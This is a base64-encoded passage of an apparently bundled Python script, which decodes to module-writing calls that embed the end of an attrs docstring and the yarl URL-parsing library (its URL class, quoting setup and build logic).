IGB0dXBsZWAgaXMgYWx3YXlzIHVzZWQgYXMgdGhlICp0dXBsZV9mYWN0b3J5Ki5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIxLjMuMFxuICAgICIiIlxuICAgIHJldHVybiBfYXN0dXBsZShcbiAgICAgICAgaW5zdD1pbnN0LCByZWN1cnNlPXJlY3Vyc2UsIGZpbHRlcj1maWx0ZXIsIHJldGFpbl9jb2xsZWN0aW9uX3R5cGVzPVRydWVcbiAgICApXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgneWFybC9fX2luaXRfXy5weScsIGInZnJvbSAuX3VybCBpbXBvcnQgVVJMLCBjYWNoZV9jbGVhciwgY2FjaGVfY29uZmlndXJlLCBjYWNoZV9pbmZvXHJcblxyXG5fX3ZlcnNpb25fXyA9ICIxLjcuMiJcclxuXHJcbl9fYWxsX18gPSAoIlVSTCIsICJjYWNoZV9jbGVhciIsICJjYWNoZV9jb25maWd1cmUiLCAiY2FjaGVfaW5mbyIpXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCd5YXJsL191cmwucHknLCBiJ2ltcG9ydCBmdW5jdG9vbHNcclxuaW1wb3J0IHN5c1xyXG5pbXBvcnQgd2FybmluZ3NcclxuZnJvbSBjb2xsZWN0aW9ucy5hYmMgaW1wb3J0IE1hcHBpbmcsIFNlcXVlbmNlXHJcbmZyb20gaXBhZGRyZXNzIGltcG9ydCBpcF9hZGRyZXNzXHJcbmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBTcGxpdFJlc3VsdCwgcGFyc2VfcXNsLCB1cmxqb2luLCB1cmxzcGxpdCwgdXJsdW5zcGxpdCwgcXVvdGVcclxuXHJcbmZyb20gbXVsdGlkaWN0IGltcG9ydCBNdWx0aURpY3QsIE11bHRpRGljdFByb3h5XHJcbmltcG9ydCBpZG5hXHJcblxyXG5pbXBvcnQgbWF0aFxyXG5cclxuXHJcbmZyb20gLl9xdW90aW5nIGltcG9ydCBfUXVvdGVyLCBfVW5xdW90ZXJcclxuXHJcblxyXG5ERUZBVUxUX1BPUlRTID0geyJodHRwIjogODAsICJodHRwcyI6IDQ0MywgIndzIjogODAsICJ3c3MiOiA0NDN9XHJcblxyXG5zZW50aW5lbCA9IG9iamVjdCgpXHJcblxyXG5cclxuZGVmIHJld3JpdGVfbW9kdWxlKG9iajogb2JqZWN0KSAtPiBvYmplY3Q6XHJcbiAgICBvYmouX19tb2R1bGVfXyA9ICJ5YXJsIlxyXG4gICAgcmV0dXJuIG9ialxyXG5cclxuXHJcbmNsYXNzIGNhY2hlZF9wcm9wZXJ0eTpcclxuICAgICIiIlVzZSBhcyBhIGNsYXNzIG1ldGhvZCBkZWNvcmF0b3IuICBJdCBvcGVyYXRlcyBhbG1vc3QgZXhhY3RseSBsaWtlXHJcbiAgICB0aGUgUHl0aG9uIGBAcHJvcGVydHlgIGRlY29yYXRvciwgYnV0IGl0IHB1dHMgdGhlIHJlc3VsdCBvZiB0aGVcclxuICAgIG1ldGhvZCBpdCBkZWNvcmF0ZXMgaW50byB0aGUgaW5zdGFuY2UgZGljdCBhZnRlciB0aGUgZmlyc3QgY2FsbCxcclxuICAgIGVmZmVjdGl2ZWx5IHJlcGxhY2luZyB0aGUgZnVuY3Rpb24gaXQgZGVjb3JhdGVzIHdpdGggYW4gaW5zdGFuY2VcclxuICAgIHZhcmlhYmxlLiAgSXQgaXMsIGluIFB5dGhvbiBwYXJsYW5jZSwgYSBkYXRhIGRlc2NyaXB0b3IuXHJcblxyXG4gICAgIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHdyYXBwZWQpOlxyXG4gICAgICAgIHNlbGYud3JhcHBlZCA9IHdyYXBwZWRcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHNlbGYuX19kb2NfXyA9IHdyYXBwZWQuX19kb2NfX1xyXG4gICAgICAgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgICAgICAgICBzZWxmLl9fZG9jX18gPSAiIlxyXG4gICAgICAgIHNlbGYubmFtZSA9IHdyYXBwZWQuX19uYW1lX19cclxuXHJcbiAgICBkZWYgX19nZXRfXyhzZWxmLCBpbnN0LCBvd25lciwgX3NlbnRpbmVsPXNlbnRpbmVsKTpcclxuICAgICAgICBpZiBpbnN0IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmXHJcbiAgICAgICAgdmFsID0gaW5zdC5fY2FjaGUuZ2V0KHNlbGYubmFtZSwgX3NlbnRpbmVsKVxyXG4gICAgICAgIGlmIHZhbCBpcyBub3QgX3NlbnRpbmVsOlxyXG4gICAgICAgICAgICByZXR1cm4gdmFsXHJcbiAgICAgICAgdmFsID0gc2VsZi53cmFwcGVkKGluc3QpXHJcbiAgICAgICAgaW5zdC5fY2FjaGVbc2VsZi5uYW1lXSA9IHZhbFxyXG4gICAgICAgIHJldHVybiB2YWxcclxuXHJcbiAgICBkZWYgX19zZXRfXyhzZWxmLCBpbnN0LCB2YWx1ZSk6XHJcbiAgICAgICAgcmFpc2UgQXR0cmlidXRlRXJyb3IoImNhY2hlZCBwcm9wZXJ0eSBpcyByZWFkLW9ubHkiKVxyXG5cclxuXHJcbkByZXdyaXRlX21vZHVsZVxyXG5jbGFzcyBVUkw6XHJcbiAgICAjIERvblwndCBkZXJpdmUgZnJvbSBzdHJcclxuICAgICMgZm9sbG93IHBhdGhsaWIuUGF0aCBkZXNpZ25cclxuICAgICMgcHJvYmFibHkgVVJMIHdpbGwgbm90IHN1ZmZlciBmcm9tIHBhdGhsaWIgcHJvYmxlbXM6XHJcbiAgICAjIGl0XCdzIGludGVuZGVkIGZvciBsaWJyYXJpZXMgbGlrZSBhaW9odHRwLFxyXG4gICAgIyBub3QgdG8gYmUgcGFzc2VkIGludG8gc3RhbmRhcmQgbGlicmFyeSBmdW5jdGlvbnMgbGlrZSBvcy5vcGVuIGV0Yy5cclxuXHJcbiAgICAjIFVSTCBncmFtbWFyIChSRkMgMzk4NilcclxuICAgICMgcGN0LWVuY29kZWQgPSAiJSIgSEVYRElHIEhFWERJR1xyXG4gICAgIyByZXNlcnZlZCAgICA9IGdlbi1kZWxpbXMgLyBzdWItZGVsaW1zXHJcbiAgICAjIGdlbi1kZWxpbXMgID0gIjoiIC8gIi8iIC8gIj8iIC8gIiMiIC8gIlsiIC8gIl0iIC8gIkAiXHJcbiAgICAjIHN1Yi1kZWxpbXMgID0gIiEiIC8gIiQiIC8gIiYiIC8gIlwnIiAvICIoIiAvICIpIlxyXG4gICAgIyAgICAgICAgICAgICAvICIqIiAvICIrIiAvICIsIiAvICI7IiAvICI9IlxyXG4gICAgIyB1bnJlc2VydmVkICA9IEFMUEhBIC8gRElHSVQgLyAiLSIgLyAiLiIgLyAiXyIgLyAifiJcclxuICAgICMgVVJJICAgICAgICAgPSBzY2hlbWUgIjoiIGhpZXItcGFydCBbICI/IiBxdWVyeSBdIFsgIiMiIGZyYWdtZW50IF1cclxuICAgICMgaGllci1wYXJ0ICAgPSAiLy8iIGF1dGhvcml0eSBwYXRoLWFiZW1wdHlcclxuICAgICMgICAgICAgICAgICAgLyBwYXRoLWFic29sdXRlXHJcbiAgICAjICAgICAgICAgICAgIC8gcGF0aC1yb290bGVzc1xyXG4gICAgIyAgICAgICAgICAgICAvIHBhdGgtZW1wdHlcclxuICAgICMgc2NoZW1lICAgICAgPSBBTFBIQSAqKCBBTFBIQSAvIERJR0lUIC8gIisiIC8gIi0iIC8gIi4iIClcclxuICAgICMgYXV0aG9yaXR5ICAgPSBbIHVzZXJpbmZvICJAIiBdIGhvc3QgWyAiOiIgcG9ydCBdXHJcbiAgICAjIHVzZXJpbmZvICAgID0gKiggdW5yZXNlcnZlZCAvIHBjdC1lbmNvZGVkIC8gc3ViLWRlbGltcyAvICI6IiApXHJcbiAgICAjIGhvc3QgICAgICAgID0gSVAtbGl0ZXJhbCAvIElQdjRhZGRyZXNzIC8gcmVnLW5hbWVcclxuICAgICMgSVAtbGl0ZXJhbCA9ICJbIiAoIElQdjZhZGRyZXNzIC8gSVB2RnV0dXJlICApICJdIlxyXG4gICAgIyBJUHZGdXR1cmUgID0gInYiIDEqSEVYRElHICIuIiAxKiggdW5yZXNlcnZlZCAvIHN1Yi1kZWxpbXMgLyAiOiIgKVxyXG4gICAgIyBJUHY2YWRkcmVzcyA9ICAgICAgICAgICAgICAgICAgICAgICAgICAgIDYoIGgxNiAiOiIgKSBsczMyXHJcbiAgICAjICAgICAgICAgICAgIC8gICAgICAgICAgICAgICAgICAgICAgICI6OiIgNSggaDE2ICI6IiApIGxzMzJcclxuICAgICMgICAgICAgICAgICAgLyBbICAgICAgICAgICAgICAgaDE2IF0gIjo6IiA0KCBoMTYgIjoiICkgbHMzMlxyXG4gICAgIyAgICAgICAgICAgICAvIFsgKjEoIGgxNiAiOiIgKSBoMTYgXSAiOjoiIDMoIGgxNiAiOiIgKSBsczMyXHJcbiAgICAjICAgICAgICAgICAgIC8gWyAqMiggaDE2ICI6IiApIGgxNiBdICI6OiIgMiggaDE2ICI6IiApIGxzMzJcclxuICAgICMgICAgICAgICAgICAgLyBbICozKCBoMTYgIjoiICkgaDE2IF0gIjo6IiAgICBoMTYgIjoiICAgbHMzMlxyXG4gICAgIyAgICAgICAgICAgICAvIFsgKjQoIGgxNiAiOiIgKSBoMTYgXSAiOjoiICAgICAgICAgICAgICBsczMyXHJcbiAgICAjICAgICAgICAgICAgIC8gWyAqNSggaDE2ICI6IiApIGgxNiBdICI6OiIgICAgICAgICAgICAgIGgxNlxyXG4gICAgIyAgICAgICAgICAgICAvIFsgKjYoIGgxNiAiOiIgKSBoMTYgXSAiOjoiXHJcbiAgICAjIGxzMzIgICAgICAgID0gKCBoMTYgIjoiIGgxNiApIC8gSVB2NGFkZHJlc3NcclxuICAgICMgICAgICAgICAgICAgOyBsZWFzdC1zaWduaWZpY2FudCAzMiBiaXRzIG9mIGFkZHJlc3NcclxuICAgICMgaDE2ICAgICAgICAgPSAxKjRIRVhESUdcclxuICAgICMgICAgICAgICAgICAgOyAxNiBiaXRzIG9mIGFkZHJlc3MgcmVwcmVzZW50ZWQgaW4gaGV4YWRlY2ltYWxcclxuICAgICMgSVB2NGFkZHJlc3MgPSBkZWMtb2N0ZXQgIi4iIGRlYy1vY3RldCAiLiIgZGVjLW9jdGV0ICIuIiBkZWMtb2N0ZXRcclxuICAgICMgZGVjLW9jdGV0ICAgPSBESUdJVCAgICAgICAgICAgICAgICAgOyAwLTlcclxuICAgICMgICAgICAgICAgICAgLyAleDMxLTM5IERJR0lUICAgICAgICAgOyAxMC05OVxyXG4gICAgIyAgICAgICAgICAgICAvICIxIiAyRElHSVQgICAgICAgICAgICA7IDEwMC0xOTlcclxuICAgICMgICAgICAgICAgICAgLyAiMiIgJXgzMC0zNCBESUdJVCAgICAgOyAyMDAtMjQ5XHJcbiAgICAjICAgICAgICAgICAgIC8gIjI1IiAleDMwLTM1ICAgICAgICAgIDsgMjUwLTI1NVxyXG4gICAgIyByZWctbmFtZSAgICA9ICooIHVucmVzZXJ2ZWQgLyBwY3QtZW5jb2RlZCAvIHN1Yi1kZWxpbXMgKVxyXG4gICAgIyBwb3J0ICAgICAgICA9ICpESUdJVFxyXG4gICAgIyBwYXRoICAgICAgICAgID0gcGF0aC1hYmVtcHR5ICAgIDsgYmVnaW5zIHdpdGggIi8iIG9yIGlzIGVtcHR5XHJcbiAgICAjICAgICAgICAgICAgICAgLyBwYXRoLWFic29sdXRlICAgOyBiZWdpbnMgd2l0aCAiLyIgYnV0IG5vdCAiLy8iXHJcbiAgICAjICAgICAgICAgICAgICAgLyBwYXRoLW5vc2NoZW1lICAgOyBiZWdpbnMgd2l0aCBhIG5vbi1jb2xvbiBzZWdtZW50XHJcbiAgICAjICAgICAgICAgICAgICAgLyBwYXRoLXJvb3RsZXNzICAgOyBiZWdpbnMgd2l0aCBhIHNlZ21lbnRcclxuICAgICMgICAgICAgICAgICAgICAvIHBhdGgtZW1wdHkgICAgICA7IHplcm8gY2hhcmFjdGVyc1xyXG4gICAgIyBwYXRoLWFiZW1wdHkgID0gKiggIi8iIHNlZ21lbnQgKVxyXG4gICAgIyBwYXRoLWFic29sdXRlID0gIi8iIFsgc2VnbWVudC1ueiAqKCAiLyIgc2VnbWVudCApIF1cclxuICAgICMgcGF0aC1ub3NjaGVtZSA9IHNlZ21lbnQtbnotbmMgKiggIi8iIHNlZ21lbnQgKVxyXG4gICAgIyBwYXRoLXJvb3RsZXNzID0gc2VnbWVudC1ueiAqKCAiLyIgc2VnbWVudCApXHJcbiAgICAjIHBhdGgtZW1wdHkgICAgPSAwPHBjaGFyPlxyXG4gICAgIyBzZWdtZW50ICAgICAgID0gKnBjaGFyXHJcbiAgICAjIHNlZ21lbnQtbnogICAgPSAxKnBjaGFyXHJcbiAgICAjIHNlZ21lbnQtbnotbmMgPSAxKiggdW5yZXNlcnZlZCAvIHBjdC1lbmNvZGVkIC8gc3ViLWRlbGltcyAvICJAIiApXHJcbiAgICAjICAgICAgICAgICAgICAgOyBub24temVyby1sZW5ndGggc2VnbWVudCB3aXRob3V0IGFueSBjb2xvbiAiOiJcclxuICAgICMgcGNoYXIgICAgICAgICA9IHVucmVzZXJ2ZWQgLyBwY3QtZW5jb2RlZCAvIHN1Yi1kZWxpbXMgLyAiOiIgLyAiQCJcclxuICAgICMgcXVlcnkgICAgICAgPSAqKCBwY2hhciAvICIvIiAvICI/IiApXHJcbiAgICAjIGZyYWdtZW50ICAgID0gKiggcGNoYXIgLyAiLyIgLyAiPyIgKVxyXG4gICAgIyBVUkktcmVmZXJlbmNlID0gVVJJIC8gcmVsYXRpdmUtcmVmXHJcbiAgICAjIHJlbGF0aXZlLXJlZiAgPSByZWxhdGl2ZS1wYXJ0IFsgIj8iIHF1ZXJ5IF0gWyAiIyIgZnJhZ21lbnQgXVxyXG4gICAgIyByZWxhdGl2ZS1wYXJ0ID0gIi8vIiBhdXRob3JpdHkgcGF0aC1hYmVtcHR5XHJcbiAgICAjICAgICAgICAgICAgICAgLyBwYXRoLWFic29sdXRlXHJcbiAgICAjICAgICAgICAgICAgICAgLyBwYXRoLW5vc2NoZW1lXHJcbiAgICAjICAgICAgICAgICAgICAgLyBwYXRoLWVtcHR5XHJcbiAgICAjIGFic29sdXRlLVVSSSAgPSBzY2hlbWUgIjoiIGhpZXItcGFydCBbICI/IiBxdWVyeSBdXHJcbiAgICBfX3Nsb3RzX18gPSAoIl9jYWNoZSIsICJfdmFsIilcclxuXHJcbiAgICBfUVVPVEVSID0gX1F1b3RlcihyZXF1b3RlPUZhbHNlKVxyXG4gICAgX1JFUVVPVEVSID0gX1F1b3RlcigpXHJcbiAgICBfUEFUSF9RVU9URVIgPSBfUXVvdGVyKHNhZmU9IkA6IiwgcHJvdGVjdGVkPSIvKyIsIHJlcXVvdGU9RmFsc2UpXHJcbiAgICBfUEFUSF9SRVFVT1RFUiA9IF9RdW90ZXIoc2FmZT0iQDoiLCBwcm90ZWN0ZWQ9Ii8rIilcclxuICAgIF9RVUVSWV9RVU9URVIgPSBfUXVvdGVyKHNhZmU9Ij8vOkAiLCBwcm90ZWN0ZWQ9Ij0rJjsiLCBxcz1UcnVlLCByZXF1b3RlPUZhbHNlKVxyXG4gICAgX1FVRVJZX1JFUVVPVEVSID0gX1F1b3RlcihzYWZlPSI/LzpAIiwgcHJvdGVjdGVkPSI9KyY7IiwgcXM9VHJ1ZSlcclxuICAgIF9RVUVSWV9QQVJUX1FVT1RFUiA9IF9RdW90ZXIoc2FmZT0iPy86QCIsIHFzPVRydWUsIHJlcXVvdGU9RmFsc2UpXHJcbiAgICBfRlJBR01FTlRfUVVPVEVSID0gX1F1b3RlcihzYWZlPSI/LzpAIiwgcmVxdW90ZT1GYWxzZSlcclxuICAgIF9GUkFHTUVOVF9SRVFVT1RFUiA9IF9RdW90ZXIoc2FmZT0iPy86QCIpXHJcblxyXG4gICAgX1VOUVVPVEVSID0gX1VucXVvdGVyKClcclxuICAgIF9QQVRIX1VOUVVPVEVSID0gX1VucXVvdGVyKHVuc2FmZT0iKyIpXHJcbiAgICBfUVNfVU5RVU9URVIgPSBfVW5xdW90ZXIocXM9VHJ1ZSlcclxuXHJcbiAgICBkZWYgX19uZXdfXyhjbHMsIHZhbD0iIiwgKiwgZW5jb2RlZD1GYWxzZSwgc3RyaWN0PU5vbmUpOlxyXG4gICAgICAgIGlmIHN0cmljdCBpcyBub3QgTm9uZTogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgICAgICAgICB3YXJuaW5ncy53YXJuKCJzdHJpY3QgcGFyYW1ldGVyIGlzIGlnbm9yZWQiKVxyXG4gICAgICAgIGlmIHR5cGUodmFsKSBpcyBjbHM6XHJcbiAgICAgICAgICAgIHJldHVybiB2YWxcclxuICAgICAgICBpZiB0eXBlKHZhbCkgaXMgc3RyOlxyXG4gICAgICAgICAgICB2YWwgPSB1cmxzcGxpdCh2YWwpXHJcbiAgICAgICAgZWxpZiB0eXBlKHZhbCkgaXMgU3BsaXRSZXN1bHQ6XHJcbiAgICAgICAgICAgIGlmIG5vdCBlbmNvZGVkOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiQ2Fubm90IGFwcGx5IGRlY29kaW5nIHRvIFNwbGl0UmVzdWx0IilcclxuICAgICAgICBlbGlmIGlzaW5zdGFuY2UodmFsLCBzdHIpOlxyXG4gICAgICAgICAgICB2YWwgPSB1cmxzcGxpdChzdHIodmFsKSlcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkNvbnN0cnVjdG9yIHBhcmFtZXRlciBzaG91bGQgYmUgc3RyIilcclxuXHJcbiAgICAgICAgaWYgbm90IGVuY29kZWQ6XHJcbiAgICAgICAgICAgIGlmIG5vdCB2YWxbMV06ICAjIG5ldGxvY1xyXG4gICAgICAgICAgICAgICAgbmV0bG9jID0gIiJcclxuICAgICAgICAgICAgICAgIGhvc3QgPSAiIlxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgaG9zdCA9IHZhbC5ob3N0bmFtZVxyXG4gICAgICAgICAgICAgICAgaWYgaG9zdCBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkludmFsaWQgVVJMOiBob3N0IGlzIHJlcXVpcmVkIGZvciBhYnNvbHV0ZSB1cmxzIilcclxuXHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgcG9ydCA9IHZhbC5wb3J0XHJcbiAgICAgICAgICAgICAgICBleGNlcHQgVmFsdWVFcnJvciBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICJJbnZhbGlkIFVSTDogcG9ydCBjYW5cJ3QgYmUgY29udmVydGVkIHRvIGludGVnZXIiXHJcbiAgICAgICAgICAgICAgICAgICAgKSBmcm9tIGVcclxuXHJcbiAgICAgICAgICAgICAgICBuZXRsb2MgPSBjbHMuX21ha2VfbmV0bG9jKFxyXG4gICAgICAgICAgICAgICAgICAgIHZhbC51c2VybmFtZSwgdmFsLnBhc3N3b3JkLCBob3N0LCBwb3J0LCBlbmNvZGU9VHJ1ZSwgcmVxdW90ZT1UcnVlXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIHBhdGggPSBjbHMuX1BBVEhfUkVRVU9URVIodmFsWzJdKVxyXG4gICAgICAgICAgICBpZiBuZXRsb2M6XHJcbiAgICAgICAgICAgICAgICBwYXRoID0gY2xzLl9ub3JtYWxpemVfcGF0aChwYXRoKVxyXG5cclxuICAgICAgICAgICAgY2xzLl92YWxpZGF0ZV9hdXRob3JpdHlfdXJpX2Fic19wYXRoKGhvc3Q9aG9zdCwgcGF0aD1wYXRoKVxyXG4gICAgICAgICAgICBxdWVyeSA9IGNscy5fUVVFUllfUkVRVU9URVIodmFsWzNdKVxyXG4gICAgICAgICAgICBmcmFnbWVudCA9IGNscy5fRlJBR01FTlRfUkVRVU9URVIodmFsWzRdKVxyXG4gICAgICAgICAgICB2YWwgPSBTcGxpdFJlc3VsdCh2YWxbMF0sIG5ldGxvYywgcGF0aCwgcXVlcnksIGZyYWdtZW50KVxyXG5cclxuICAgICAgICBzZWxmID0gb2JqZWN0Ll9fbmV3X18oY2xzKVxyXG4gICAgICAgIHNlbGYuX3ZhbCA9IHZhbFxyXG4gICAgICAgIHNlbGYuX2NhY2hlID0ge31cclxuICAgICAgICByZXR1cm4gc2VsZlxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIGJ1aWxkKFxyXG4gICAgICAgIGNscyxcclxuICAgICAgICAqLFxyXG4gICAgICAgIHNjaGVtZT0iIixcclxuICAgICAgICBhdXRob3JpdHk9IiIsXHJcbiAgICAgICAgdXNlcj1Ob25lLFxyXG4gICAgICAgIHBhc3N3b3JkPU5vbmUsXHJcbiAgICAgICAgaG9zdD0iIixcclxuICAgICAgICBwb3J0PU5vbmUsXHJcbiAgICAgICAgcGF0aD0iIixcclxuICAgICAgICBxdWVyeT1Ob25lLFxyXG4gICAgICAgIHF1ZXJ5X3N0cmluZz0iIixcclxuICAgICAgICBmcmFnbWVudD0iIixcclxuICAgICAgICBlbmNvZGVkPUZhbHNlXHJcbiAgICApOlxyXG4gICAgICAgICIiIkNyZWF0ZXMgYW5kIHJldHVybnMgYSBuZXcgVVJMIiIiXHJcblxyXG4gICAgICAgIGlmIGF1dGhvcml0eSBhbmQgKHVzZXIgb3IgcGFzc3dvcmQgb3IgaG9zdCBvciBwb3J0KTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgIFwnQ2FuXFxcJ3QgbWl4ICJhdXRob3JpdHkiIHdpdGggInVzZXIiLCAicGFzc3dvcmQiLCAiaG9zdCIgb3IgInBvcnQiLlwnXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBpZiBwb3J0IGFuZCBub3QgaG9zdDpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcJ0NhblxcXCd0IGJ1aWxkIFVSTCB3aXRoICJwb3J0IiBidXQgd2l0aG91dCAiaG9zdCIuXCcpXHJcbiAgICAgICAgaWYgcXVlcnkgYW5kIHF1ZXJ5X3N0cmluZzpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcJ09ubHkgb25lIG9mICJxdWVyeSIgb3IgInF1ZXJ5X3N0cmluZyIgc2hvdWxkIGJlIHBhc3NlZFwnKVxyXG4gICAgICAgIGlmIChcclxuICAgICAgICAgICAgc2NoZW1lIGlzIE5vbmVcclxuICAgICAgICAgICAgb3IgYXV0aG9yaXR5IGlzIE5vbmVcclxuICAgICAgICAgICAgb3IgcGF0aCBpcyBOb25lXHJcbiAgICAgICAgICAgIG9yIHF1ZXJ5X3N0cmluZyBpcyBOb25lXHJcbiAgICAgICAgICAgIG9yIGZyYWdtZW50IGlzIE5vbmVcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICBcJ05vbmVUeXBlIGlzIGlsbGVnYWwgZm9yICJzY2hlbWUiLCAiYXV0aG9yaXR5IiwgInBhdGgiLCBcJ1xyXG4gICAgICAgICAgICAgICAgXCcicXVlcnlfc3RyaW5nIiwgYW5kICJmcmFnbWVudCIgYXJncywgdXNlIGVtcHR5IHN0cmluZyBpbnN0ZWFkLlwnXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgYXV0aG9yaXR5OlxyXG4gICAgICAgICAgICBpZiBlbmNvZGVkOlxyXG4gICAgICAgICAgICAgICAgbmV0bG9jID0gYXV0aG9yaXR5XHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICB0bXAgPSBTcGxpdFJlc3VsdCgiIiwgYXV0aG9yaXR5LCAiIiwgIiIsICIiKVxyXG4gICAgICAgICAgICAgICAgbmV0bG9jID0gY2xzLl9tYWtlX25ldGxvYyhcclxuICAgICAgICAgICAgICAgICAgICB0bXAudXNlcm5hbWUsIHRtcC5wYXNzd29yZCwgdG1wLmhvc3RuYW1lLCB0bXAucG9ydCwgZW5jb2RlPVRydWVcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICBlbGlmIG5vdCB1c2VyIGFuZCBub3QgcGFzc3dvcmQgYW5kIG5vdCBob3N0IGFuZCBub3QgcG9ydDpcclxuICAgICAgICAgICAgbmV0bG9jID0gIiJcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBuZXRsb2MgPSBjbHMuX21ha2VfbmV0bG9jKFxyXG4gICAgICAgICAgICAgICAgdXNlciwgcGFzc3dvcmQsIGhvc3QsIHBvcnQsIGVuY29kZT1ub3QgZW5jb2RlZCwgZW5jb2RlX2hvc3Q9bm90IGVuY29kZWRcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGlmIG5vdCBlbmNvZGVkOlxyXG4gICAgICAgICAgICBwYXRoID0gY2xzLl9QQVRIX1FVT1RFUihwYXRoKVxyXG4gICAgICAgICAgICBpZiBuZXRsb2M6XHJcbiAgICAgICAgICAgICAgICBwYXRoID0gY2xzLl9ub3JtYWxpemVfcGF0aChwYXRoKVxyXG5cclxuICAgICAgICAgICAgY2xzLl92YWxpZGF0ZV9hdXRob3JpdHlfdXJpX2Fic19wYXRoKGhvc3Q9aG9zdCwgcGF0aD1wYXRoKVxyXG4gICAgICAgICAgICBxdWVyeV9zdHJpbmcgPSBjbHMuX1FVRVJZX1FVT1RFUihxdWVyeV9zdHJpbmcpXHJcbiAgICAgICAgICAgIGZyYWdtZW50ID0gY2xzLl9GUkFHTUVOVF9RVU9URVIoZnJhZ21lbnQpXHJcblxyXG4gICAgICAgIHVybCA9IGNscyhcclxuICAgICAgICAgICAgU3BsaXRSZXN1bHQoc2NoZW1lLCBuZXRsb2MsIHBhdGgsIHF1ZXJ5X3N0cmluZywgZnJhZ21lbnQpLCBlbmNvZGVkPVRydWVcclxuICAgICAgICApXHJcblxyXG4gICAgICAgIGlmIHF1ZXJ5OlxyXG4gICAgICAgICAgICByZXR1cm4gdXJsLndpdGhfcXVlcnkocXVlcnkpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIHVybFxyXG5cclxuICAgIGRlZiBfX2luaXRfc3ViY2xhc3NfXyhjbHMpOlxyXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcigiSW5oZXJpdGluZyBhIGNsYXNzIHshcn0gZnJvbSBVUkwgaXMgZm9yYmlkZGVuIi5mb3JtYXQoY2xzKSlcclxuXHJcbiAgICBkZWYgX19zdHJfXyhzZWxmKTpcclxuICAgICAgICB2YWwgPSBzZWxmLl92YWxcclxuICAgICAgICBpZiBub3QgdmFsLnBhdGggYW5kIHNlbGYuaXNfYWJzb2x1dGUoKSBhbmQgKHZhbC5xdWVyeSBvciB2YWwuZnJhZ21lbnQpOlxyXG4gICAgICAgICAgICB2YWwgPSB2YWwuX3JlcGxhY2UocGF0aD0iLyIpXHJcbiAgICAgICAgcmV0dXJuIHVybHVuc3BsaXQodmFsKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcclxuICAgICAgICByZXR1cm4gInt9KFwne31cJykiLmZvcm1hdChzZWxmLl9fY2xhc3NfXy5fX25hbWVfXywgc3RyKHNlbGYpKVxyXG5cclxuICAgIGRlZiBfX2J5dGVzX18oc2VsZik6XHJcbiAgICAgICAgcmV0dXJuIHN0cihzZWxmKS5lbmNvZGUoImFzY2lpIilcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyKTpcclxuICAgICAgICBpZiBub3QgdHlwZShvdGhlcikgaXMgVVJMOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgdmFsMSA9IHNlbGYuX3ZhbFxyXG4gICAgICAgIGlmIG5vdCB2YWwxLnBhdGggYW5kIHNlbGYuaXNfYWJzb2x1dGUoKTpcclxuICAgICAgICAgICAgdmFsMSA9IHZhbDEuX3JlcGxhY2UocGF0aD0iLyIpXHJcblxyXG4gICAgICAgIHZhbDIgPSBvdGhlci5fdmFsXHJcbiAgICAgICAgaWYgbm90IHZhbDIucGF0aCBhbmQgb3RoZXIuaXNfYWJzb2x1dGUoKTpcclxuICAgICAgICAgICAgdmFsMiA9IHZhbDIuX3JlcGxhY2UocGF0aD0iLyIpXHJcblxyXG4gICAgICAgIHJldHVybiB2YWwxID09IHZhbDJcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZik6XHJcbiAgICAgICAgcmV0ID0gc2VsZi5fY2FjaGUuZ2V0KCJoYXNoIilcclxuICAgICAgICBpZiByZXQgaXMgTm9uZTpcclxuICAgICAgICAgICAgdmFsID0gc2VsZi5fdmFsXHJcbiAgICAgICAgICAgIGlmIG5vdCB2YWwucGF0aCBhbmQgc2VsZi5pc19hYnNvbHV0ZSgpOlxyXG4gICAgICAgICAgICAgICAgdmFsID0gdmFsLl9yZXBsYWNlKHBhdGg9Ii8iKVxyXG4gICAgICAgICAgICByZXQgPSBzZWxmLl9jYWNoZVsiaGFzaCJdID0gaGFzaCh2YWwpXHJcbiAgICAgICAgcmV0dXJuIHJldFxyXG5cclxuICAgIGRlZiBfX2x